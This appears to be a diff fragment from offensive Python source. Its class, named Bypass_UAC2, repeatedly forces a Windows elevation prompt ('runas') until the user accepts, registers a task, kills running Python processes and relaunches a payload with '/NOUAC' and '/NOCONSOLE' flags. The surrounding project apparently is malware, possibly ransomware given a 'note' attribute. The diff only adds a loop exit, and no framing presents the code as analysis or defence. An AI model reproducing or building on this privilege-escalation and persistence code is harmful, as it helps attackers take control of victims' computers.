@@ -26,6 +26,7 @@ class Bypass_UAC2():
 			while True:
 				try:
 					shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c " + filename + " /regtask")
+					break
 				except Exception as ex:
 					pass
 		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
